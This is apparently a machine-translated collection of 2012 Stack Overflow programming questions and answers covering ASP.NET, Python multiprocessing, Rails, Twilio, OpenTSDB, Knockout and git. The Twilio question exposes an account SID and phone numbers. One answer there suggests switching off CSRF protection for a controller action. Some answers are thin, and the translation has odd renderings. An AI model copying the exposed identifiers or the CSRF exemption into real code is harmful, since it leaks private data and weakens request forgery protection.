<wsa:To>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</wsa:To> 
<wsse:Security>
<wsu:Timestamp wsu:Id="Timestamp-abc8d6ea-d75d-42a2-b042-87309692c2bb">
<wsu:Created>2012-06-27T19:14:43Z</wsu:Created> 
<wsu:Expires>2012-06-27T19:19:43Z</wsu:Expires> 
</wsu:Timestamp>
</wsse:Security>
</soap:Header>
<soap:Body>
<ProcessMessageResponse xmlns="http://www.starstandards.org/webservices/2005/10/transport">
<payload>
<content id="Content0">
<VehicleSaleGroupsTable xmlns="">
<VehicleSaleGroupRecord xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
<CompanyNumber>ZE7</CompanyNumber> 
<FranchiseType>N</FranchiseType> 
<FranchiseCode>NC</FranchiseCode> 
<FranchiseDescription>NEW CAR</FranchiseDescription> 
<Manufacturer /> 
<UsedSaleAccount /> 
<UsedInventoryAccount /> 
</VehicleSaleGroupRecord>
<VehicleSaleGroupRecord xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
<CompanyNumber>ZE7</CompanyNumber> 
<FranchiseType>N</FranchiseType> 
<FranchiseCode>NT</FranchiseCode> 
<FranchiseDescription>NEW TRUCK</FranchiseDescription> 
<Manufacturer /> 
<UsedSaleAccount /> 
<UsedInventoryAccount /> 
</VehicleSaleGroupRecord>
<VehicleSaleGroupRecord xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
<CompanyNumber>ZE7</CompanyNumber> 
<FranchiseType>U</FranchiseType> 
<FranchiseCode>UC</FranchiseCode> 
<FranchiseDescription>USED CAR</FranchiseDescription> 
<Manufacturer /> 
<UsedSaleAccount>USALE</UsedSaleAccount> 
<UsedInventoryAccount>UINV</UsedInventoryAccount> 
</VehicleSaleGroupRecord>
<VehicleSaleGroupRecord xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
<CompanyNumber>ZE7</CompanyNumber> 
<FranchiseType>U</FranchiseType> 
<FranchiseCode>UT</FranchiseCode> 
<FranchiseDescription>USED TRUCK</FranchiseDescription> 
<Manufacturer /> 
<UsedSaleAccount>USALE</UsedSaleAccount> 
<UsedInventoryAccount>UINV</UsedInventoryAccount> 
</VehicleSaleGroupRecord>
</VehicleSaleGroupsTable>
</content>
</payload>
</ProcessMessageResponse>
</soap:Body>
</soap:Envelope> 
```

我打开 Visual Studio 命令行程序并输入以下内容：

> C:\xml2xsd\xsd myXML.xml

它生成了 5 个 xsd 文件，然后我输入了以下内容：

> C:\xml2xsd\xsd /c myXML.xsd

我收到以下消息，没有创建类文件：

> Microsoft (R) Xml Schemas/DataTypes 支持实用程序 [Microsoft (R) .NET Framework，版本 2.0.50727.3038] 版权所有 (C) Microsoft Corporation。版权所有。架构验证警告：未声明“http://www.starstandards.org/webservices/2005/10/transport:ProcessMessageResponse”元素。第 25 行，第 16 位。模式验证警告：未声明“http://schemas.xmlsoap.org/ws/2004/08/addressing:Action”元素。第 13 行，第 16 位。模式验证警告：未声明“http://schemas.xmlsoap.org/ws/2004/08/addressing:MessageID”元素。第 14 行，第 16 位。模式验证警告：未声明“http://schemas.xmlsoap.org/ws/2004/08/addressing:RelatesTo”元素。第 15 行，第 16 位。模式验证警告：'http://schemas.xmlsoap. org/ws/2004/08/addressing:To' 元素未声明。第 16 行，第 16 位。模式验证警告：未声明“http://www.starstandards.org/webservices/2005/10/transport:PayloadManifest”元素。第 17 行，第 16 位。模式验证警告：未声明“http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd:Security”元素. 第 18 行，第 16 位。
> 
> 警告：无法验证架构。类生成可能会失败或可能产生不正确的结果。
> 
> 错误：为模式“myxmlRESfile”生成类时出错。- 缺少元素“http://schemas.xmlsoap.org/ws/2004/08/addressing:Action”。
> 
> 如果您需要更多帮助，请输入“xsd /?”。

任何帮助将不胜感激生成这些类文件。我以前从未使用过这个工具。

谢谢！

# python - 为什么我不能在 multiprocessing.Pool 中使用 operator.itemgetter？

> ID：11235054
> 
> 赞同：7
> 
> 时间：2012-06-27T21:27:27.497
> 
> 标签：python, multiprocessing, python-multithreading

以下程序：

```
import multiprocessing,operator
f = operator.itemgetter(0)
# def f(*a): return operator.itemgetter(0)(*a)
if __name__ == '__main__':
    multiprocessing.Pool(1).map(f, ["ab"]) 
```

失败并出现以下错误：

```
Process PoolWorker-1:
Traceback (most recent call last):
  File "/usr/lib/python3.2/multiprocessing/process.py", line 267, in _bootstrap
    self.run()
  File "/usr/lib/python3.2/multiprocessing/process.py", line 116, in run
    self._target(*self._args, **self._kwargs)
  File "/usr/lib/python3.2/multiprocessing/pool.py", line 102, in worker
    task = get()
  File "/usr/lib/python3.2/multiprocessing/queues.py", line 382, in get
    return recv()
TypeError: itemgetter expected 1 arguments, got 0 
```

为什么会出现错误（在 Linux x64 上的 cPython 2.7 和 3.2 上），如果我取消注释第三行，为什么它会消失？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-27T23:06:58.977

这里的问题是 multiprocessing 模块通过复制将对象传递到其他进程（显然），并且 itemgetter 对象不能使用任何明显的方式复制：

```
In [10]: a = operator.itemgetter(0)
Out[10]: copy.copy(a)
TypeError: itemgetter expected 1 arguments, got 0

In [10]: a = operator.itemgetter(0)
Out[10]: copy.deepcopy(a)
TypeError: itemgetter expected 1 arguments, got 0

In [10]: a = operator.itemgetter(0)
Out[10]: pickle.dumps(a)
TypeError: can't pickle itemgetter objects

# etc. 
```

问题甚至不是试图在其他进程中调用 f ；它首先试图复制它。（如果您查看我在上面省略的堆栈跟踪，您会看到更多关于失败原因的信息。）

当然通常这并不重要，因为动态构建一个新的 itemgetter 几乎和复制一个 itemgetter 一样容易和有效。这就是您的替代“f”函数正在做的事情。（当然，复制动态创建 itemgetter 的函数不需要复制 itemgetter。）

您可以将“f”转换为 lambda。或者编写一个简单的函数（命名或 lambda），在不使用 itemgetter 的情况下做同样的事情。或者编写一个可复制的 itemgetter 替换（这显然不会那么难）。但是您不能按您想要的方式直接使用 itemgetter 对象。

# asp.net - ASP.net 中是否有 after Page_Load 事件

> ID：11235062
> 
> 赞同：39
> 
> 时间：2012-06-27T21:27:55.257
> 
> 标签：asp.net, page-lifecycle, pageload

是否有在*所有* `Page_Load`事件完成后触发的事件？

> 我怎样才能拥有多个`Page_Load`？
> 当您拥有用户控件时。

在我的页面可以呈现之前，我需要我的页面（和所有嵌入式控件）通过完成他们的`Page_Load`事件来初始化自己。

当然，问题在于，如果我将代码放入页面的`Page_Load`处理程序中：

```
MyPage.aspx
   --> Page_Load
          ---> DoSomethingWithUserControl()
UserControl1.ascx
   --> Page_Load
          ---> initialize ourselves now that viewstate has been restored 
```

`UserControl1`然后我开始在它准备好之前访问我的控件。

我需要一种*在*所有`Page_Load`事件触发后、但*在*任何回发事件（例如 Click 事件）触发之前运行代码的方法：

```
MyPage.aspx
   --> Page_Load
UserControl1.ascx
   --> Page_Load
          ---> initialize ourselves now that viewstate has been restored
MyPage.aspx
   --> Page_AfterLoad
          ---> DoSomethingWithUserControl() 
```

查看 MSDN 中的页面生命周期，在所有 Page_Loads 完成*后*似乎无法引发事件：

![在此处输入图像描述](../Images/c31bb49c9d321472e60f840d9f3ac57f.png)

在所有 Page_Loads 完成*之后，*有没有办法提高？

* * *

## 回答 #1

> 赞同：65
> 
> 时间：2012-06-27T21:28:32.113

[**`Page_LoadComplete`**](http://msdn.microsoft.com/en-us/library/system.web.ui.page.loadcomplete.aspx)是加载所有控件后引发的事件

请记住，该`Init`事件首先由所有子控件触发，并且当所有控件都已初始化时，才`Init`引发页面事件。事件`Load`反过来工作，页面首先引发`Load`事件，然后每个子控件引发自己的`Load`事件。最后`LoadComplete`提出。**请注意，仅当控件是在设计时创建时才是正确的**，当控件是动态创建时，它们（遗憾地）没有严格遵循这种方法。

来自 MSDN：

> 如果控件是在运行时动态创建或在数据绑定控件的模板中以声明方式创建的，则它们的事件最初不会与页面上其他控件的事件同步。例如，**对于在运行时添加的控件，Init 和 Load 事件在页面生命周期中发生的时间可能**比以声明方式创建的控件的相同事件要晚得多。因此，从它们被实例化的那一刻起，动态添加的控件和模板中的控件一个接一个地引发它们的事件，直到它们赶上它被添加到 Controls 集合中的事件。

看一看：

（来源：http: [//msdn.microsoft.com/en-us/library/ms178472.aspx](http://msdn.microsoft.com/en-us/library/ms178472.aspx)）

![在此处输入图像描述](../Images/466b83c82fb92ff35edcb275dbb3ff0b.png)

## 编辑 1

为了满足您的所有要求：

> 我需要一种在所有 Page_Load 事件触发后、但在任何回发事件（例如 Click 事件）触发之前运行代码的方法：

我认为最简单的方法是在用户控件中声明一个自定义事件并在加载控件后触发它，然后在您的 ASPX 中订阅该事件

### 用户控制

```
 public event Action LoadCompleted = delegate { };

    protected void Page_Load(object sender, EventArgs e)
    {
        this.LoadCompleted();
    } 
```

### ASPX 页面

```
 protected void Page_Load(object sender, EventArgs e)
    {
        this.myUserControl.LoadCompleted += () => 
        {
            // do somethign interesting
            this.lblMessage.Text = DateTime.Now.ToString();
        };
    } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-28T10:21:32.787

似乎真的没有办法可靠地让您的代码在所有（静态声明的，请参阅 Jupaols 对动态添加的评论）控件加载的时间和它们的回发事件引发的时间之间执行。

我什至使用反射器来反汇编 Page 类，据我所知，页面没有调用任何你可以在这些时间之间使用的方法。

因此，对于一般情况，您似乎不走运。

但你的说法

> 然后我在准备好之前开始访问我的 UserControl1 控件

是有问题的。到`Page_Load`调用该方法时，所有控件（至少是静态声明的控件）上都已设置了视图状态和控件状态。因此，除非您在控件的 OnLoad 方法中进行更多的状态初始化，否则该控件已准备好进行修改。如果您确实在 OnLoad 中发生了一些事情，那么为什么不在那里进行修补呢？

# liferay - 在 Liferay 中对动态数据列表模板中的项目进行排序

> ID：11235065
> 
> 赞同：1
> 
> 时间：2012-06-27T21:28:01.810
> 
> 标签：liferay, liferay-6, liferay-velocity, dynamic-data-list

我正在 Liferay 6.1 中试验动态数据列表。数据定义和列表编辑器工作正常，但我无法准备模板来显示列表。特别是我想知道如何实现显示的排序和分页，因为列表最终会变得很长。

让我们从订购开始。理论上，下面的模板应该使用允许 OrderByComparator ( [http://bit.ly/MqsGNE](http://bit.ly/MqsGNE) ) 的 getRecords 方法，但是工厂在哪里，可以让我创建所需的比较器？

```
#set ($ddlRecordsUtil = $serviceLocator.findService("com.liferay.portlet.dynamicdatalists.service.DDLRecordLocalService")) 
#set ($recordSetId = $getterUtil.getLong($reserved_record_set_id.data)) 

## How to create an OrderByComparator which would ORDER_BY_text2132_DESC ??

#set ($orderBy = ???????????)
#set ($records = ${ddlRecordsUtil.getRecords($recordSetId,-1,-1,50, $orderBy)}) 

<ul> 
#foreach ($record in $records)

    #set ($name = $record.getField("text2132").getValue()) 

    <li><em>${name}</em></li> 

#end 
</ul> 
```

我是否遗漏了什么，是否有另一种方法可以在从数据库中获取这些列表之前对其进行排序？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-10T05:22:41.310

```
#set ($records = ${ddlRecordsUtil.getRecords($recordSetId,-1,-1,50,ORDER_BY_text2132_DESC)}) 
```

试试这个，这会奏效。

# audio - Web Audio API - 如何使用 AudioPannerNode 进行常规 LR 平移

> ID：11235068
> 
> 赞同：2
> 
> 时间：2012-06-27T21:28:09.883
> 
> 标签：audio, webkit, web-audio-api

AudioPannerNode 是一个处理节点，它在三维空间中定位/空间化传入的音频流。有没有办法将它用于常规的 LR 平移，记住它使用 3D 笛卡尔坐标系以及听众，其位置和方向与平移器的位置和方向一起用于确定音频将如何空间化？或者我应该跳过 AudioPannerNode，并尝试使用 LR 增益节点来实现这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T23:11:01.390

LR 平移非常简单，您可以使用您描述的任何一种方法。我会错误地使用空间化模型（基于物理引擎），否则您需要调整自己的平衡。

即使您不做 3D，您也可以投影到 2D，并且也可以使用前/后平衡，而不是直接进入 1D。

有关 Web Audio API 中空间化音频的更多信息，请参阅[Web Audio for Games 一文](http://www.html5rocks.com/en/tutorials/webaudio/games/#toc-3d)。

# macos - 上下文菜单项方法 swizzling

> ID：11235082
> 
> 赞同：0
> 
> 时间：2012-06-27T21:29:33.143
> 
> 标签：macos, methods, finder

知道如何通过方法 swizzling 在 finder 中处理上下文菜单单击吗？我正在尝试为此查找需要从 Finder.h 覆盖的方法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-06-05T19:54:52.510

我发现了这个示例，它展示了如何使用方法调配和代码注入来添加项目。

[https://github.com/infinitelabs/FinderMenu](https://github.com/infinitelabs/FinderMenu)

> 将子菜单添加到 Mac OS X Finder 的上下文菜单中。子菜单有两个项目，单击它们会显示包含所选项目的窗口。

它使用[https://github.com/rentzsch/mach_inject](https://github.com/rentzsch/mach_inject)来更新 Finder 进程。似乎它应该做你想做的事。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-23T06:33:58.440

在 Objective-C 消息上使用`gdb`和设置断点。您还可以使用`instrument`工具来查找方法名称。

# ruby-on-rails - 更改模型属性的值

> ID：11235084
> 
> 赞同：0
> 
> 时间：2012-06-27T21:29:55.233
> 
> 标签：ruby-on-rails, rest, heroku, attributes, twilio

我正在使用 Twilio 发送 SMS 消息以更改特定模型（用户）属性的值（在本例中为：money）。

我成功地从 Twilio POST 中提取了参数，尽管没有运气将属性更改保存到模型的属性中。有什么想法吗？

这是用户控制器中“更新”的代码：

```
 def update
    @user = User.find(params[:id])

    respond_to do |format|
      if @user.update_attributes(params[:user])
        format.html { redirect_to @user, notice: 'User was successfully updated.' }
        format.json { head :no_content }

      else
        format.html { render action: "edit" }
        format.json { render json: @user.errors, status: :unprocessable_entity }
      end
    end

    require 'rubygems'
    require 'twilio-ruby'

    @account_sid = 'AC0626c6d8dc0a4551b159161c5ca7ced2'
    @auth_token = '**********************************'

    # set up a client to talk to the Twilio REST API
    @client = Twilio::REST::Client.new(@account_sid, @auth_token)

    message_body = params["Body"]
    from_number = params["From"]

    if from_number == "+**********"
      @user = User.find(1) # :select => :money
      existing_money = @user.money
      doug_sum = message_body.to_f + existing_money

      @user.money = doug_sum
      @user.save

      puts "This is Doug's sum: #{doug_sum} and it has been saved"
    else
      puts "This is not a valid frump number"  
    end

  end 
```

以下是 Heroku 服务器日志的内容：

```
2012-06-27T21:09:06+00:00 app[web.1]: Started POST "/users" for 184.73.31.10 at 2012-06-27 21:09:06 +0000
2012-06-27T21:09:06+00:00 app[web.1]: Processing by UsersController#create as HTML
2012-06-27T21:09:06+00:00 app[web.1]:   Parameters: {"AccountSid"=>"AC0626c6d8dc0a4551b159161c5ca7ced2", "Body"=>"4", "ToZip"=>"13203", "FromState"=>"NY", "ToCity"=>"SYRACUSE", "SmsSid"=>"SMa973490ac1db98b25247b600fe068d6f", "ToState"=>"NY", "To"=>"+13158491369", "ToCountry"=>"US", "FromCountry"=>"US", "SmsMessageSid"=>"SMa973490ac1db98b25247b600fe068d6f", "ApiVersion"=>"2010-04-01", "FromCity"=>"SYRACUSE", "SmsStatus"=>"received", "From"=>"+13154368655", "FromZip"=>"13135"}
2012-06-27T21:09:06+00:00 app[web.1]: WARNING: Can't verify CSRF token authenticity
2012-06-27T21:09:06+00:00 app[web.1]:   Rendered users/_form.html.erb (5.4ms)
2012-06-27T21:09:06+00:00 app[web.1]:   Rendered users/new.html.erb within layouts/application (34.9ms)
2012-06-27T21:09:06+00:00 app[web.1]: Completed 200 OK in 47ms (Views: 36.7ms | ActiveRecord: 1.5ms)
2012-06-27T21:09:06+00:00 heroku[router]: POST frump.herokuapp.com/users dyno=web.1 queue=0 wait=0ms service=57ms status=200 bytes=1582 
```

最后，这是接收 SMS 的 Twiml 文件：

```
<?xml version="1.0" encoding="UTF-8" ?> 
<Response>
    <Redirect method="POST">http://frump.herokuapp.com/users</Redirect>
</Response> 
```

这是视图代码：

```
<% @users.each do |user| %>
  <tr>
    <td><%= user.name %></td>
    <td>$<%= user.money %></td>
    <td><%= link_to 'Show', user %></td>
    <td><%= link_to 'Edit', edit_user_path(user) %></td>
    <td><%= link_to 'Destroy', user, method: :delete, data: { confirm: 'Are you sure?' } %></td>
  </tr>
<% end %>
</table> 
```

提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T05:32:48.787

日志说`WARNING: Can't verify CSRF token authenticity`，所以可能由于您的 Rails 应用程序端的身份验证失败，您没有从“twilio”获取数据。就像拥有

```
protect_from_forgery 
```

在您的应用程序控制器中。

尝试从伪造保护中排除您的行为，然后查看，例如

```
class UsersController < ApplicationController
  protect_from_forgery :except => ["create"]
end 
```

高温高压

# c# - 将数据写入 OpenTSDB 的 C# 代码

> ID：11235089
> 
> 赞同：2
> 
> 时间：2012-06-27T21:31:03.377
> 
> 标签：c#, sockets, opentsdb

SO中的一个（有点-它与C#没有直接关系）相关问题是：[如何在OpenTSDB（时间序列数据库）中插入数据](https://stackoverflow.com/questions/8520612/how-to-insert-data-in-opentsdb-time-series-database-from-client)；如那里所述，易于工作的基本shell命令（在linux中）如下：

```
echo "put mymetric.data_1 1295643636 48 a=foo" | nc -w 15 tsdHost tsdPort 
```

我的问题是有人用 C# 为 OpenTSDB 编写过收集器吗？我面临的问题是，虽然我可以打开一个到 tsd 实例/端口的 Socket 并将以下内容写入它的流，但似乎什么也没发生。

```
put mymetric.data_1 1295643636 48 a=foo 
```

我正在创建一个基于 InterNetwork、Stream 的 TCP 套接字，并尝试将上述字符串作为 ASCII、UTF-8、-16 和 -32 编码字节发送，但都是徒劳的。

我需要使用哪种类型的 Socket 和哪种类型的编码字节中的任何指针都会有帮助。`Java`我试图实现的同一件事的代码示例是：

```
Socket sock = new Socket("tsd.server.com", 4242); 
String point = "put my.metric 1314137008 60 host=someplace.net foo=1\n"; 
sock.getOutputStream().write(point.getBytes()); 
sock.close(); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-29T13:02:33.320

我刚刚意识到我发送的字符串末尾没有换行符。在 Java 代码示例中，换行符是显式的。

最后添加一个换行符解决了这个问题。

显式添加换行符的示例代码：

```
string message = "put mymetric.data_1 1295643636 48 a=foo";
IPAddress ip = IPAddress.Parse("xxx.xxx.xxx.xxx"); // tsdb deamon host ip
IPEndPoint endPoint = new IPEndPoint(ip, 4242); // tsdb deamon port

using (Socket s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp))
{
    s.Connect(endPoint);
    s.Send(new ASCIIEncoding().GetBytes(message + Environment.NewLine));
    s.Close();  
} 
```

# c# - edmx 验证引发有关碰撞主键的错误

> ID：11235092
> 
> 赞同：0
> 
> 时间：2012-06-27T21:31:14.750
> 
> 标签：c#, .net, entity-framework, entity-framework-4, edmx

我有 3 个实体`BaseUser`：`AuthenticationUser`和`User`。`AuthenticationUser`继承自`BaseUser`和`User`继承自`AuthenticationUser`。`User`实体具有二进制（照片）类型的标量属性，因此我想将`User`实体拆分为`User`and `UserPhoto`。

我完全按照这篇好文章所说的去做：http: [//www.deveducate.com/blog/post/2010/12/14/Entity-Framework-Modeling-Table-Splitting.aspx](http://www.deveducate.com/blog/post/2010/12/14/Entity-Framework-Modeling-Table-Splitting.aspx)

这是我的 edmx 的图像： ![在此处输入图像描述](../Images/a73d828c1bf3b82df5963bd378756f7a.png)

当我验证 edmx 时，我不断收到此错误：

```
Error 3033: Problem in mapping fragments starting at line 13058:EntitySets 'UserPhotoes' and 'BaseUsers' are both mapped to table 'T_USER'. Their primary keys may collide. 
```

这个错误的含义是什么？
知道如何解决这个问题吗？

# knockout.js - CoffeeScript、淘汰赛和可观察的

> ID：11235095
> 
> 赞同：10
> 
> 时间：2012-06-27T21:31:31.073
> 
> 标签：knockout.js, coffeescript

我有以下 CoffeeScript 来为 Knockoutjs 生成 Javascript

```
class NewsItem
    content: ko.observable("")
    title: ko.observable("")

    constructor: (data,dispForm) ->
        @content data.get_item("content")
        @title data.get_item("title")
        @id = data.get_id()

class NewsItemViewModel
    collection: ko.observableArray()

    loadAll: =>
            listEnumerator = items.getEnumerator()          
            while listEnumerator.moveNext()
                 currentItem = listEnumerator.get_current()
                 @collection.push new NewsItem currentItem, @list.get_defaultDisplayFormUrl()
            return

$ -> 
    viewModel = new NewsItemViewModel
    ko.applyBindings viewModel
    return 
```

要呈现 HTML，我使用此代码

```
<ul id="results" data-bind="template: {name: 'item_template', foreach: collection}">
</ul>
<script id="item_template" type="text/x-jquery-tmpl"> 
<li>
    <h3><a href="/" data-bind="text: title"></a></h3>
    <p>
        <textarea data-bind="value: content"></textarea>
        <input type="button" value="save" data-bind="enable: content().length > 0">
    </p>
</li>   
</script> 
```

但是，在 HTML 中，所有项目都显示添加到集合中的最后一个 NewsItem 的值。

有什么提示吗？

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-06-27T22:32:01.933

好的，这可能是 CoffeeScript 的缺陷之一：

```
class NewsItem
    content: ko.observable("") 
```

在这里，您正在创建一个新类，其属性“内容”是一个可观察对象。这将编译为以下 JavaScript：

```
var NewsItem = (function() {
    function NewsItem() {}
    NewsItem.prototype.content = ko.observable("");
    return NewsItem;
})(); 
```

如您现在所见，属性“content”附加到原型。这意味着：只创建了一个可观察对象，而不是每个实例一个。因此，无论何时执行此操作`new NewsItem`，构造函数都会更新原型中的这个单个可观察对象，因此所有实例的值都相同。

要解决这个问题，只需在构造函数中创建 observable。这样，它会附加到实例，而不是原型：

```
class NewsItem
    constructor: (data,dispForm) ->
        @content = ko.observable data.get_item("content") 
```

编译成（相关部分）：

```
this.content = ko.observable(data.get_item("content")); 
```

# opengl - 延迟着色

> ID：11235099
> 
> 赞同：1
> 
> 时间：2012-06-27T21:32:04.170
> 
> 标签：opengl, rendering

我正在考虑实现一个延迟渲染器并且有一些问题。
规格：OpenGL 3.0，最多 3 个渲染目标，必须支持高光指数、自发光指数。

1.  以 8 位和 16 位存储普通组件之间的区别是否明显？
2.  24 位（线性）深度分量对于户外场景是否足够准确？
3.  使用哪个 g 缓冲区配置（g 缓冲区大小与参数重建）？

**选项**1：32位色深，需要从深度进行位置重建，从法线X，Y进行法线Z重建，但更小
RT1：24深度；8 材质索引（有没有我可以这样使用的纹理格式？）
RT2：16 normX；16 normY
RT3：8红色；8绿色；8 蓝色；7 个镜面反射指数，1 个发射光（压缩）

**选项**2：64位色深，不重建，但大一倍，并有一些浪费的空间（rgb和材料索引）
RT1：16 posX；16 位；16个位置；16材料指数
RT2：16 normX；16 正常；16 标准Z；16 高光指数
RT3：16 红色；16绿色；16 蓝色；16 发射指数

谢谢你的帮助！

# ruby-on-rails - 如何在 Rails routes.rb 中有多个约束？

> ID：11235101
> 
> 赞同：6
> 
> 时间：2012-06-27T21:32:20.483
> 
> 标签：ruby-on-rails, ruby-on-rails-3

我想要一条考虑到 2 个约束的 rails 路线。如何才能做到这一点？两个约束

```
match ':id' => 'pages#temp', :constraints => { :uuid => /[A-Za-z\d]([-\w]{,498}[A-Za-z\d])?/ }
root :to => 'pages#temp', :constraints => lambda {|r| r.env["warden"].authenticate? } 
```

在两个约束都到位的情况下，我怎样才能拥有这样的一条路线？谢谢

```
match ':id' => 'pages#temp', :constraints => 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2014-12-28T08:35:11.193

我想您将不得不创建一个自定义约束类并将所有约束放在那里。有关详细信息，请参阅 rails 指南中的高级约束（链接如下）。

[http://guides.rubyonrails.org/routing.html#advanced-constraints](http://guides.rubyonrails.org/routing.html#advanced-constraints)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2020-01-04T15:57:20.550

我不得不对子域和用户名使用多个约束。我用一个块来解决问题：

```
constraints subdomain: ['survey', 'survey.staging'] do
    match "/(:username)", to: "responses#index", constraints: { username: /[0-z\.\-\_]+/ }, :via => [:get, :post]
end 
```

所以你可以尝试这样的事情：

```
constraints id: { uuid: /[A-Za-z\d]([-\w]{,498}[A-Za-z\d])?/ } do
  match '/:id' to: 'pages#temp', constraints: lambda {|r| r.env["warden"].authenticate? }
end 
```

# ruby-on-rails - 我可以删除我的本地 .git 存储库吗？

> ID：11235108
> 
> 赞同：1
> 
> 时间：2012-06-27T21:32:35.613
> 
> 标签：ruby-on-rails, git, heroku

我的 heroku repo 增长到 1.5gb，所以 heroku 支持的好人清除了远程 heroku repo 并建议我推送一个新副本。

但是，du -h .git 在本地的结果显示 .git 为 276m。而且，可以预见的是，当我尝试将 master 推送到它时，heroku 会引发错误。

所以，我的问题是：我可以删除我的本地 .git 文件夹，`git init`然后推送到 heroku 吗？那究竟会做什么？

我的应用程序代码被推送到 github - 我通常的工作流程是：

```
git add .
git commit -m "message"
git push #to github
git push heroku master 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-27T21:57:31.667

### 可能的问题

您的存储库可能比预期的大有两个可能的原因。

1.  您的存储库中有很多二进制资产。
2.  你有一个巨大的提交历史。

### 可能的解决方案

如果这些事情中的任何一个是原因，那么您有几个选择。考虑以下。

1.  如果您的问题是二进制资产，请将您的资产移动到外部资产存储（例如 Amazon S3 或远程文件系统）。然后，您可以使用 git-filter-branch 后跟 git-gc 从历史记录中删除它们。这将大大减少您的存储库。

2.  如果您的问题是一个非常大的历史，请制作一个单独的[浅克隆](http://www.kernel.org/pub/software/scm/git/docs/git-clone.html)以推送到 Heroku。例如：

    ```
    git clone --depth 1 my_repo heroku_repo 
    ```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-27T21:36:55.930

好吧，你不能这样做，除非你强制推动（这几乎不推荐）。这将清除您的整个提交历史并创建一个全新的存储库。

但如果你想因为空间而抹去一切……你可以。只是……很奇怪。

如果你只推送 master 会发生什么？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-27T21:37:35.570

你可能想做一些[家务](http://www.kernel.org/pub/software/scm/git/docs/git-gc.html)。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-07T18:23:35.853

做赞成的答案，但请记住，您不能推动浅层克隆。这是一个后续：[在浅层克隆之后推送到 github](https://stackoverflow.com/questions/11375070/pushing-to-github-after-a-shallow-clone)

# c++ - 加减乘除模板函数

> ID：11235112
> 
> 赞同：2
> 
> 时间：2012-06-27T21:33:04.770
> 
> 标签：c++, templates

我正在尝试找到可以执行以下操作的模板函数：

```
template <typename T>
T add(T lhs, T rhs) {
    return lhs + rhs;
} 
```

（用于加法、减法、乘法和除法）。

我记得有一套标准的功能——你还记得它们是什么吗？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-06-27T21:33:55.053

在标题`<functional>`中，您会找到类似`std::plus`、`std::minus`、`std::multiplies`和的内容`std::divides`。

它们也不是函数。它们实际上是[函子](https://stackoverflow.com/questions/356950/c-functors-and-their-uses)。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-06-27T21:34:58.920

您需要标头中的仿函数，例如[std::plus](http://en.cppreference.com/w/cpp/utility/functional/plus)`<functional>`。请参阅[此处的](http://en.cppreference.com/w/cpp/utility/functional)**算术运算** 。

这些是函子，而不是函数，所以你需要一个实例来做任何有用的事情：

```
#include <functional>
#include <iostream>
int main() {

  std::multiplies<int> m;
  std::cout << m(5,3) << "\n";

} 
```

在上面的示例中，这似乎有点矫枉过正，但它们对于标准库算法非常有用。例如，求向量中元素的乘积：

```
std::vector<int> v{1,2,3,4,5,6};
int prod = std::accumulate(v.begin(), v.end(), 1, std::multiplies<int>()); 
```

# jquery - 如何在 jquery 中使用 $.ajax 异步获取 xml 文件中的数据

> ID：11235114
> 
> 赞同：0
> 
> 时间：2012-06-27T21:33:20.870
> 
> 标签：jquery, xml, ajax

```
$.ajax({
    type:"GET",
    url: 'resourse/test.xml',
    dataType: 'xml',
    async: true,
    success: function(data){ 
```

我想从 xml 文件中获取数据。这样我就可以将数据存储在 var 中，一个线程可以写入 var，而另一个线程可以将 var 中的数据写入图表。怎么做。我尝试了几种方法，但似乎成功下的事件在加载整个 xml 文件之前就停止了。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-27T21:41:26.017

我的猜测是您正在读取 ajax 调用范围之外的变量，因此它将在 ajax 调用实际完成之前被调用。

js是异步的

```
$.ajax(...); //fires off
$.ajax(...); //This one will fire off before the first ajax call is finished 
```

还可以尝试使用断点单步执行您的 js 代码，您将很快看到会发生什么......

# iphone - 如何处理游戏期间弹出的 iPhone“电量不足”

> ID：11235115
> 
> 赞同：6
> 
> 时间：2012-06-27T21:33:22.190
> 
> 标签：iphone, cocos2d-iphone, interrupt, battery

我想知道在游戏过程中如何处理低电量警报。我使用 Cocos2D 制作我的游戏。当短信或电话等中断进入时，我会暂停游戏。但是低电量警报呢？它们和其他中断一样吗？似乎不是。

有什么方法可以检测到它何时出现以便我可以暂停游戏？

感谢您的回复。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-27T21:38:16.603

您可以设置“电池监控”并在发生这种情况时获取事件。一些信息链接：

[http://mobileorchard.com/new-in-iphone-30-tutorial-series-part-5-battery-monitoring](http://mobileorchard.com/new-in-iphone-30-tutorial-series-part-5-battery-monitoring)

[http://mobiledevelopertips.com/device/display-battery-state-and-level-of-charge.html](http://mobiledevelopertips.com/device/display-battery-state-and-level-of-charge.html)

你知道你担心的事件是当它达到 20% 时，所以我认为你可以检查那个数量并在它发生时暂停。

这可能不是一个完美的解决方案，因为苹果可以决定它应该发生在 25%，而不是 20%。

